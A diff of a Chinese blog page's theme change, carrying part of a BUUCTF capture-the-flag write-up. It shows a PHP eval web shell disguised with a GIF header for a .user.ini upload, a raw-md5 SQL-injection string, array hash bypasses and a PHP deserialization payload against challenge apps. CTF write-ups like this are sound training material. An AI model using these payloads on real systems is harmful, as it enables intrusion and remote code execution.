 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=<span class="number">123</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201141749208.png" alt="image-20210201141749208"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201141749208.png" alt="image-20210201141749208" title="">
+                </div>
+                <div class="image-caption">image-20210201141749208</div>
+            </figure>
+
 <h3 id="HCTF-2018-admin1"><a href="#HCTF-2018-admin1" class="headerlink" title="[HCTF 2018]admin1"></a>[HCTF 2018]admin1</h3><p>登录用户名admin，密码123，登录成功</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201143348694.png" alt="image-20210201143348694"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201143348694.png" alt="image-20210201143348694" title="">
+                </div>
+                <div class="image-caption">image-20210201143348694</div>
+            </figure>
+
 <p>随便注册一个账户登录，再修改密码源码里面发现提示</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201143828718.png" alt="image-20210201143828718"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201143828718.png" alt="image-20210201143828718" title="">
+                </div>
+                <div class="image-caption">image-20210201143828718</div>
+            </figure>
+
 <p>把代码clone到本地</p>
 <p>代码审计</p>
 <p>在routes.py里面的register()，login()，change()三个函数里面都有strlower函数</p>
@@ -528,7 +1105,14 @@
 
 <p>同时cookie那里也要修改为1</p>
 <p>得到flag</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201151947175.png" alt="image-20210201151947175"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201151947175.png" alt="image-20210201151947175" title="">
+                </div>
+                <div class="image-caption">image-20210201151947175</div>
+            </figure>
+
 <h3 id="SUCTF-2019-CheckIn1"><a href="#SUCTF-2019-CheckIn1" class="headerlink" title="[SUCTF 2019]CheckIn1"></a>[SUCTF 2019]CheckIn1</h3><p>题目给了源码，进去看一下，有个wp，里面提示说.user.ini</p>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html</a></p>
 <p>p牛的博客里面提到过</p>
@@ -541,7 +1125,16 @@
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF98a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210202120743721.png" alt="image-20210202120743721"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210202120743721.png" alt="image-20210202120743721" title="">
+                </div>
+                <div class="image-caption">image-20210202120743721</div>
+            </figure>
+
+
+
 <h3 id="BJDCTF2020-Easy-MD51"><a href="#BJDCTF2020-Easy-MD51" class="headerlink" title="[BJDCTF2020]Easy MD51"></a>[BJDCTF2020]Easy MD51</h3><p>通过抓包可以发现提示</p>
 <p>*<em>Hint: select * from ‘admin’ where password=md5($pass,true)*</em></p>
 <p>ffifdyop在被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’</p>
@@ -557,7 +1150,16 @@
 <p>这里还是可以数组绕过</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param1[]=<span class="number">1</span>&amp;param2[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210202124809382.png" alt="image-20210202124809382"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210202124809382.png" alt="image-20210202124809382" title="">
+                </div>
+                <div class="image-caption">image-20210202124809382</div>
+            </figure>
+
+
+
 <h3 id="ZJCTF-2019-NiZhuanSiWei1"><a href="#ZJCTF-2019-NiZhuanSiWei1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei1"></a>[ZJCTF 2019]NiZhuanSiWei1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>代码审计一波</p>
@@ -576,135 +1178,882 @@
 <p>最后payload构造如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="comment">//text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210202174257229.png" alt="image-20210202174257229"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210202174257229.png" alt="image-20210202174257229" title="">
+                </div>
+                <div class="image-caption">image-20210202174257229</div>
+            </figure>
 
-  </div>
-  <footer class="article-footer">
-    
-  <div class="cc">
-    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.z" target="_blank" title="署名-相同方式共享">
-      <img src="/images/cc/cc.png">
-      
-          <img src="/images/cc/by.png">
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
         
-          <img src="/images/cc/sa.png">
-      
-      <span>
-        本作品采用知识共享 署名-相同方式共享 4.0 国际许可协议进行许可。
-      </span>
-    </a>
-  </div>
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">武英强</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2021/01/16/buuctf-writeup/">http://example.com/2021/01/16/buuctf-writeup/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">武英强</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
 
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/WriteUP/">
+                                    <span class="chip bg-color">WriteUP</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
 
     
 
-  </footer>
-</article>
-
-
-
-
-
-
-
-          <div class="main-footer">
-  
-    © 2021 会飞的鱼的Blog - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
-  
 </div>
 
-      
-        </div>
-      
-    </div>
-  </div>
-  
-<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
-
-
-  
-<link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
-
-  
-<link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">
-
-
-  <!-- Root element of PhotoSwipe. Must have class pswp. -->
-  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    <!-- Background of PhotoSwipe.
-             It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-
-      <!-- Container that holds slides.
-                PhotoSwipe keeps only 3 of them in the DOM to save memory.
-                Don't modify these 3 pswp__item elements, data is added later on. -->
-      <div class="pswp__container">
-        <div class="pswp__item"></div>
-        <div class="pswp__item"></div>
-        <div class="pswp__item"></div>
-      </div>
-
-      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-      <div class="pswp__ui pswp__ui--hidden">
-
-        <div class="pswp__top-bar">
-
-          <!--  Controls are self-explanatory. Order can be changed. -->
-
-          <div class="pswp__counter"></div>
-
-          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-          <button class="pswp__button pswp__button--share" title="Share"></button>
-
-          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-          <!-- element will get class pswp__preloader--active when preloader is running -->
-          <div class="pswp__preloader">
-            <div class="pswp__preloader__icn">
-              <div class="pswp__preloader__cut">
-                <div class="pswp__preloader__donut"></div>
-              </div>
+                </div>
             </div>
-          </div>
+            
         </div>
-
-        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-          <div class="pswp__share-tooltip"></div>
-        </div>
-
-        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
-
-        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
-
-        <div class="pswp__caption">
-          <div class="pswp__caption__center"></div>
-        </div>
-      </div>
     </div>
-  </div>
 
-  
-<script src="/PhotoSwipe/photoswipe.js"></script>
+    
 
-  
-<script src="/PhotoSwipe/photoswipe-ui-default.js"></script>
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'xL8rbseQJWHC643SeDPTmyra-gzGzoHsz',
+        appKey: 'eDBc3tM9ty2QloRazNjbUjRh',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/02/23/xiao-bai-zhuang-ji-jiao-cheng/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="WIN系统安装小白教程">
+                        
+                        <span class="card-title">WIN系统安装小白教程</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-23
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            武英强
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%95%99%E7%A8%8B/">
+                        <span class="chip bg-color">教程</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/01/05/ji-ben-huan-jing-da-jian/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="基本环境搭建">
+                        
+                        <span class="card-title">基本环境搭建</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            武英强
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%8A%80%E6%9C%AF/">
+                        <span class="chip bg-color">技术</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
 
 
 
 
-<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2021</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">武英强</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/flyingfish20201" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
 
 
-<script src="/scripts/main.js"></script>
 
+    <a href="mailto:wyq123445@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
